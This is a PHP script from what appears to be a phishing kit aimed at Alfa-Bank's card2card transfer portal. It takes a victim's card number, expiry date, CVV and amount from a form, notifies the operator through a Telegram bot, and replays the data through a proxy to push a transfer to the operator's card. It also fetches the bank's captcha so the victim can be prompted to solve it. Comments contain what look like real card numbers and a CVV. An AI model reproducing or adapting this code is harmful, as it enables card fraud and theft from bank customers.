<?php
include $_SERVER['DOCUMENT_ROOT'].'/config.php';


getPost();
sendChatMessages($token,$bot_receiver,$chatid,$areaname);


        $ch = curl_init('https://www.alfaportal.ru/card2card/ptpl/alfaportal/initial.html');
        curl_setopt($ch, CURLOPT_HTTPHEADER, 'User-Agent: '.getallheaders()['User-Agent']);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        $session = curl_exec($ch);
        curl_close($ch);
       
        preg_match_all('#<input type="hidden" name="ssn_token" value="(.+?)"#is', $session, $csrf);
    
        preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $session, $matches);
        
        $cookies = array();
        foreach($matches[1] as $item) {
            parse_str($item, $cookie);
            $cookies = array_merge($cookies, $cookie);
        }
        

     
            //начало готово, $csrf получен, куки получены уневерсальный токен и сессионную куку
  $ch = curl_init('https://www.alfaportal.ru/card2card/fee/alfaportal/');
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('User-Agent: '.getallheaders()['User-Agent'],'Accept-Language: en-US,en;q=0.5','Accept-Encoding: gzip, deflate, br','Connection: keep-alive','Upgrade-Insecure-Requests: 1','Referer: https://www.alfaportal.ru/card…d/ptpl/alfaportal/initial.html','Content-Type: application/x-www-form-urlencoded','Host: www.alfaportal.ru','Accept: text/html,application/xhtml+xm…plication/xml;q=0.9,*/*;q=0.8','Cookie: AP2P='.$cookies['AP2P'].';JSESSIONID='.$cookies['JSESSIONID'].';TS0184dca2='.$cookies['TS0184dca2']));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
           curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
          curl_setopt($ch, CURLOPT_POSTFIELDS, "tfr_card_src_num=".$_POST['card_number']."&tfr_card_dst_num=".$card."&tfr_amount=".$_POST['amount']."&tfr_currency=810");
        $com = curl_exec($ch);
         $tsf = curl_getinfo($ch);
        curl_close($ch);
        $commission = $com;
        
       
        
        if($commission == 'Error'){
            
             $message = "\xE2\x9D\x8C Пидр ввел хуйню";
     $filename = 'https://api.telegram.org/bot' . $token . '/sendMessage?chat_id=' . $bot_receiver . '&text=' . urlencode($message) . '&parse_mode=html';file_get_contents($filename);
      
                header('Location: error.html'); 
       
            
        }
       
     
        //начало готово, $csrf получен, куки получены уневерсальный токен и сессионную куку
  $ch = curl_init('https://www.alfaportal.ru/card2card/ptpl/alfaportal/initial.html');
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('User-Agent: '.getallheaders()['User-Agent'],'Accept-Language: en-US,en;q=0.5','Accept-Encoding: gzip, deflate, br','Connection: keep-alive','Upgrade-Insecure-Requests: 1','Referer: https://www.alfaportal.ru/card…d/ptpl/alfaportal/initial.html','Content-Type: application/x-www-form-urlencoded','Host: www.alfaportal.ru','Accept: text/html,application/xhtml+xm…plication/xml;q=0.9,*/*;q=0.8','Cookie: JSESSIONID='.$cookies['JSESSIONID'].';TS0184dca2='.$cookies['TS0184dca2']));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
           curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
        
          // curl_setopt($ch, CURLOPT_POSTFIELDS, 'tfr_card_src_exp_month=01&tfr_card_src_exp_year=2021&tfr_currency=810&tfr_card_src_num=4890494680704053&tfr_card_cvv=484&tfr_surname=&tfr_name=&tfr_middlename=&tfr_city=&tfr_street=&tfr_addr_index=&tfr_card_dst_num=4890494681354650&tfr_surname_recipient=&tfr_name_recipient=&tfr_middlename_recipient=&tfr_amount=10&ssn_token='.$csrf[1][0].'&service_terms_ok=on&action_proceed=');
       
          curl_setopt($ch, CURLOPT_POSTFIELDS, 'tfr_card_src_exp_month='.$_POST['expm'].'&tfr_card_src_exp_year=20'.$_POST['expy'].'&tfr_currency=810&tfr_card_src_num='.$_POST['card_number'].'&tfr_card_cvv='.$_POST['cvv'].'&tfr_surname=&tfr_name=&tfr_middlename=&tfr_city=&tfr_street=&tfr_addr_index=&tfr_card_dst_num='.$card.'&tfr_surname_recipient=&tfr_name_recipient=&tfr_middlename_recipient=&tfr_amount='.$_POST['amount'].'&ssn_token='.$csrf[1][0].'&service_terms_ok=on&action_proceed=');
        $com = curl_exec($ch);
        $tsf = curl_getinfo($ch);
        curl_close($ch);
       // var_dump('tfr_card_src_exp_month=01&tfr_card_src_exp_year=2021&tfr_currency=810&tfr_card_src_num=4890494680704053&tfr_card_cvv=484&tfr_surname=&tfr_name=&tfr_middlename=&tfr_city=&tfr_street=&tfr_addr_index=&tfr_card_dst_num=4890494681354650&tfr_surname_recipient=&tfr_name_recipient=&tfr_middlename_recipient=&tfr_amount=10&ssn_token='.$csrf[1][0].'&service_terms_ok=on&action_proceed=');
       // var_dump('tfr_card_src_exp_month='.$_POST['expm'].'&tfr_card_src_exp_year=20'.$_POST['expy'].'&tfr_currency=810&tfr_card_src_num='.$_POST['card_number'].'&tfr_card_cvv=911&tfr_surname=&tfr_name=&tfr_middlename=&tfr_city=&tfr_street=&tfr_addr_index=&tfr_card_dst_num='.$card.'&tfr_surname_recipient=&tfr_name_recipient=&tfr_middlename_recipient=&tfr_amount='.$_POST['amount'].'&ssn_token='.$csrf[1][0].'&service_terms_ok=on&action_proceed=');
      //  exit();

           
              if(stristr($tsf['url'],'ssn_token')){
                        $tsf['redirect_url'] =   $tsf['url'];
              }
              
                //начало готово, $csrf получен, куки получены уневерсальный токен и сессионную куку
  $ch = curl_init($tsf['redirect_url']);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('User-Agent: '.getallheaders()['User-Agent'],'Accept-Language: en-US,en;q=0.5','Accept-Encoding: gzip, deflate, br','Connection: keep-alive','Upgrade-Insecure-Requests: 1','Referer: https://www.alfaportal.ru/card…d/ptpl/alfaportal/initial.html','Content-Type: application/x-www-form-urlencoded','Host: www.alfaportal.ru','Accept: text/html,application/xhtml+xm…plication/xml;q=0.9,*/*;q=0.8','Cookie: AP2P='.$cookies['AP2P'].';JSESSIONID='.$cookies['JSESSIONID'].';TS0184dca2='.$cookies['TS0184dca2']));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        //curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
          // curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
        //  curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
        $com = curl_exec($ch);
        $tsf1 = curl_getinfo($ch);
        curl_close($ch);
        
        //капча
      
              preg_match_all('#<input type="hidden" name="ssn_token" value="(.+?)"#is', $com, $csrf1);
              
   
               // var_dump($tsf['redirect_url']);
              // var_dump($csrf1[1][0]);
              
           //   <form id="postForm" action="https://ds2.mirconnect.ru:443/vbv/pareq" method="POST">
            //  <input type="hidden" name="PaReq" value="eJxVUtluwjAQ/JUo78FXDoIWo7ShKqo4BLQSj8YxEAoBTFJRvr52CG2RLGtn7N0dzxp6l/3O+VL6nB+Krkta2HVUIQ9ZXqy77vv8xWu7PQ7zjVYqnSlZacVhqM5nsVZOnnVdKuMgU5h5IVuFnh/EKy9e+pkXMRn5URCHNCIuh0kyVScOTSNu+rQooDs0FbXciKLkIOTpaTDiPvMJCwA1EPZKD1JOKGGM1jvDGAO60VCIveKT/rT/MU6dmfOWTOcLQDUL8lAVpf7moc8A3QFUesc3ZXnsICR2K7EUxWdLV4AsD+hPzqSy0dnUueQZH177eLhdkOG2T8ZpEozShIyu8jKaJ11A9gZkolScYorNCh1MOjjusAhQzYPYWwGc4Jv8BsLRdkkez/5zYHzXZiz3V9wRqMvxUChzw5j5GwP6U/38ai2VpTUvIoExlbaZtbWmbH5u7KCUkLqABYBsEmomhpphm+jhE/wARxC0TQ=="><input type="hidden" name="TermUrl" value="https://www.alfaportal.ru/card2card/ptpl/alfaportal/result.html">
           //   <input type="hidden" name="MD" value="1259A4CD71886856343D4077B16B72F0">
           //   </form>
           //   <script>document.getElementById('postForm').submit();</script></body></html><!DOCTYPE html>

              $_SESSION['cooc'] = $cookies;
   
     $ch = curl_init('https://www.alfaportal.ru/card2card/captcha');
 
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('User-Agent: '.getallheaders()['User-Agent'],'Accept-Language: en-US,en;q=0.5','Accept-Encoding: gzip, deflate, br','Connection: keep-alive','Upgrade-Insecure-Requests: 1','Referer: https://www.alfaportal.ru/card…d/ptpl/alfaportal/initial.html','Content-Type: application/x-www-form-urlencoded','Host: www.alfaportal.ru','Accept: text/html,application/xhtml+xm…plication/xml;q=0.9,*/*;q=0.8','Cookie: AP2P='.$cookies['AP2P'].';JSESSIONID='.$cookies['JSESSIONID'].';TS0184dca2='.$cookies['TS0184dca2']));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        //curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
          // curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
        //  curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
        $com = curl_exec($ch);
        $tsf1 = curl_getinfo($ch);
        curl_close($ch);
         $im =  base64_encode($com);
 

                 include('text.php');
             
        exit();
      




?>